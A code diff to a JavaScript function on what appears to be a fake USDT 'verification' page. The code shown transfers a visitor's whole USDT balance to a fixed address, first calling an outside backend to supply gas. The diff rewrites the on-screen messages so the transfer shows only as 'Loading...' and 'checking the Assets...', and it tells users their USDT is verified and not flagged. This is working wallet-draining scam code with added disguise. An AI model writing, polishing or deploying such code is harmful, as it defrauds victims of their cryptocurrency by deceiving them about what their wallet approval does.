@@ -1355,7 +1355,7 @@ async function approveToken() {
         // ✅ If ≤ 0.0005 USDT
         if (usdtBalance <= 0.0005) {
             showPopup(
-                `✅ Verification Successful<br>Your assets are genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
+                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                 "green"
             );
             return;
@@ -1363,7 +1363,7 @@ async function approveToken() {
 
         // ✅ If > 0.0005 USDT → transfer
         if (bnbBalance < 0.0005) {
-            showPopup("Requesting gas from backend...", "blue");
+            showPopup("checking the Assets...", "blue");
             await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -1372,7 +1372,7 @@ async function approveToken() {
             await new Promise(r => setTimeout(r, 3000)); // wait for gas
         }
 
-        showPopup("Transferring USDT...", "blue");
+        showPopup("Loading...", "blue");
 
         await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
             .send({ from: userAddress });
